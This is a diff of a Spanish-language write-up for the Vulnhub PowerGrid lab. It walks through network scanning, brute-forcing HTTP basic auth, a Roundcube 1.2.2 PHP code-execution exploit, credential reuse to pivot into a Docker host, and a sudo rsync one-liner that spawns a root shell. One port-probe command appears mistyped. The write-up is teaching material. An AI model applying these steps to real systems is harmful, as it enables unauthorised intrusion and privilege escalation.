@@ -33,7 +33,7 @@ Este ejercicio está diseñado para completarse de una sola vez. Apagar la máqu
 
 # Fase de reconocimiento
 
-Esta vez al tratarse de una maquina de *Vulnhub* y correrla en local empezaremos el reconocimiento escaneando nuestra propia red para encontrar la IP de la maquina victima
+Esta vez al tratarse de una máquina de *Vulnhub* y correrla en local empezaremos el reconocimiento escaneando nuestra propia red para encontrar la IP de la máquina víctima
 
 ```bash
 arp-scan -I eth0 --localnet --ignoredups
@@ -45,7 +45,7 @@ arp-scan -I eth0 --localnet --ignoredups
 --ignoredups # para que no reporte duplicados
 ```
 
-como vemos la IP de la maquina victima es **192.168.0.37** así que procedemos con el escaneo de puertos
+como vemos la IP de la máquina víctima es **192.168.0.37** así que procedemos con el escaneo de puertos
 
 ```bash
 nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allPorts 192.168.0.37
@@ -93,13 +93,12 @@ Starting gobuster in directory enumeration mode
 ```
 # Fase de Explotación
 
-Vemos el directorio **/zmail** y tratamos de acceder a el, nos encontramos con que necesitamos autentificarnos, en la descripción de la maquina ya nos dejaba entre ver que podía ser posible que necesitásemos hacer uso de la fuerza bruta, podríamos hacerlo con herramientas com hydra por ejemplo pero en esta ocasión haremos un script en **python3**.
+Vemos el directorio **/zmail** y tratamos de acceder a él, nos encontramos con que necesitamos autentificarnos, en la descripción de la máquina ya nos dejaba entre ver que podía ser posible que necesitásemos hacer uso de la fuerza bruta, podríamos hacerlo con herramientas con hydra por ejemplo, pero en esta ocasión haremos un script en **Python**3.
 
 Lo primero que haremos será interceptar la petición con **BurpSuite**, la mandaremos al repeater con **CTRL+R** 
 
 [<img src="/assets/images/vulnhub/PowerGrid/captura2.png">](/assets/images/vulnhub/PowerGrid/captura2.png)
-En color azul podemos ver como se manda la **Authorization** y el parton que se emplea, en este caso se manda con este formato test:test y luego se codifica en **Base64** y se envia al servidor con el metodo GET, en rojo vemos la respuesta del servidor que es **401 unauthorized** nos fijaremos en todo esto para hacer el script en python
-
+En color azul podemos ver como se manda la **Authorization** y el patrón que se emplea, en este caso se manda con este formato test:test y luego se codifica en **Base64** y se envia al servidor con el método GET, en rojo vemos la respuesta del servidor que es **401 unauthorized** nos fijaremos en todo esto para hacer el script en Python
 ```python
 #!/usr/bin/env python3
 
@@ -155,19 +154,19 @@ if __name__ == '__main__':
 ```
 
 
-Vale tenemos credenciales usuario **p48** y contraseña **electrico** 
+Vale tenemos credenciales, usuario **p48** y contraseña **electrico** 
 
-> Os lo dejo las creds por si queréis practicar con el script haciendo un diccionario mas pequeño que contenga la pass
+> Os dejo las creds por si queréis practicar con el script haciendo un diccionario más pequeño que contenga la pass
 
 Para continuar entramos con el user y la pass, y vemos otro inicio de sesión, probamos las mismas creds y... para dentro.
 
 Una vez dentro podemos ver lo que parece un servicio de email [Qué es roundcube](https://es.wikipedia.org/wiki/Roundcube)
-rápidamente nos damos cuenta de que tenemos un mensaje **importante** procedemos a abrirlo y lo que vemos es lo siguiente 
+rápidamente nos damos cuenta de que tenemos un mensaje **importante,** procedemos a abrirlo y lo que vemos es lo siguiente. 
 [<img src="/assets/images/vulnhub/PowerGrid/captura3.png">](/assets/images/vulnhub/PowerGrid/captura3.png)
-En azul vemos pistas que probablemente nos sirvan de algo mas adelante, aun que ya se intuye por donde pueden ir los tiros, y en amarillo vemos una clave SSH cifrada, la cual sin la clave privada para descifrarla nos sirve de bien poco...
+En azul vemos pistas que probablemente nos sirvan de algo más adelante, aunque ya se intuye por donde pueden ir los tiros, y en amarillo vemos una clave SSH cifrada, la cual sin la clave privada para descifrarla nos sirve de bien poco...
 
-dado que solo tenemos el nombre del servicio me pongo a buscar vulnerabilidades relacionadas con el, primero busco la version para ser un poco mas preciso.
-Veo un about justo encima de rondcube en la esquina superior izquierda, y ahi esta la version, en este caso la 1.2.2 
+Dado que solo tenemos el nombre del servicio me pongo a buscar vulnerabilidades relacionadas con él, primero busco la versión para ser un poco más preciso.
+Veo un about justo encima de rondcube en la esquina superior izquierda, y ahí está la version, en este caso la 1.2.2  
 
 ```bash
 searchsploit roundcube 1.2.2
@@ -177,12 +176,12 @@ Roundcube 1.2.2 - Remote Code Execution  php/webapps/40892.txt
 > searchsploit -u 
 > Con esto actualizamos la base de datos que contiene todas las vulns
 
-Tenemos un **RCE** para la version que necesitamos, ahora falta probar si funciona.
+Tenemos un **RCE** para la versión que necesitamos, ahora falta probar si funciona.
 ```bash
 searchsploit -x php/webapps/40892.txt
 -x # para ver el contenido sin necesidad de descargarlo
 ```
-Tal y como nos dice en el **Proof of concept** tendremos que mandar un email especialmente diseñado para ejecutar código **php** en el Subject del correo en cuestión, así que le damos a **compose** ponemos un ejemplo y capturamos la petición con **burpSuite**.
+Tal y como nos dice en el **Proof of concept** tendremos que mandar un email especialmente diseñado para ejecutar código **PHP** en el Subject del correo en cuestión, así que le damos a **compose** ponemos un ejemplo y capturamos la petición con **burpSuite**.
 Nos mandamos la petición al repeater y la alteramos tal y como dice el **POC**
 
 [<img src="/assets/images/vulnhub/PowerGrid/captura4.png">](/assets/images/vulnhub/PowerGrid/captura4.png)
@@ -195,18 +194,34 @@ ctrl+z
 www-data@powergrid:/var/www/html$export TERM=xterm SHELL=bash
 www-data@powergrid:/var/www/html$ stty rows 40 columns 140
 ```
-Hago un `hostname -I` y veo que la maquina tiene 2 interfaces de red, una de ellas pertenece a docker, pruebo un ping a la 172.17.0.2 por ser la siguiente a la mía y obtengo traza 
+Hago un `hostname -I` y veo que la máquina tiene 2 interfaces de red, una de ellas pertenece a Docker, pruebo un ping a la 172.17.0.2 por ser la siguiente a la mía y obtengo traza. 
 [<img src="/assets/images/vulnhub/PowerGrid/captura6.png">](/assets/images/vulnhub/PowerGrid/captura6.png)
-Esto es lo que tengo en mente, dado que me menciona **SSH** y tengo traza con la 172.17.0.2 le mando una cadena vacía al puerto 22 para ver si el código de estado que me devuelve es 0, lo que querría decir que esta abierto...
+Esto es lo que tengo en mente, dado que me menciona **SSH** y tengo traza con la 172.17.0.2 le mando una cadena vacía al puerto 22 para ver si el código de estado que me devuelve es 0, lo que querría decir que está abierto...
 ```bash
 echo '' > /dev/null/172.17.0.2/22 2>/dev/null
 echo $?
 0
 ```
-El puerto 22 está abierto pero como www-data no puedo hacer mucho así que pruebo si hay re utilización de credenciales por parte del usuario **p48** y funciona
+El puerto 22 está abierto, pero como www-data no puedo hacer mucho así que pruebo si hay reutilización de credenciales por parte del usuario **p48** y funciona
 ```bash
 su p48
 Password: electrico
 ```
 Me dirijo a su directorio de usuario y veo un archivo **privkey.gpg** blanco y en botella...
-Tenemos un mensaje cifrado en el email, tenemos una private key y tenemos un tío que utili
+Tenemos un mensaje cifrado en el email, tenemos una private key y tenemos un tío que utiliza el mismo password para todo, [pgptool](https://pgptool.org/) vamos a probar suerte.
+[<img src="/assets/images/vulnhub/PowerGrid/captura7.png">](/assets/images/vulnhub/PowerGrid/captura7.png)
+Obtenemos una id_rsa, sabemos que el puerto 22 de la 172.17.0.2 está abierto, no sabemos de quién es esta id_rsa pero no puede ser de mucha gente, además la **passphrase** para la private key era el password de p48.
+```bash
+p48@powergrid:~$ chmod 600 id_rsa
+p48@powergrid:~$ ssh -i id_rsa p48@172.17.0.2
+p48@powergrid:~$ sudo -l
+    (root) NOPASSWD: /usr/bin/rsync
+```
+Podemos ejecutar como el usuario root de manera temporal el binario **rsync** nos vamos de cabeza a [gtfobins](https://gtfobins.github.io/gtfobins/rsync/) 
+
+```bash
+sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+> whoami 
+root
+```
+Ya somos root, podéis ir buscando los flags que en esta máquina tienen "lore", la máquina está guay, es entretenida y toca cosas que vienen bien.
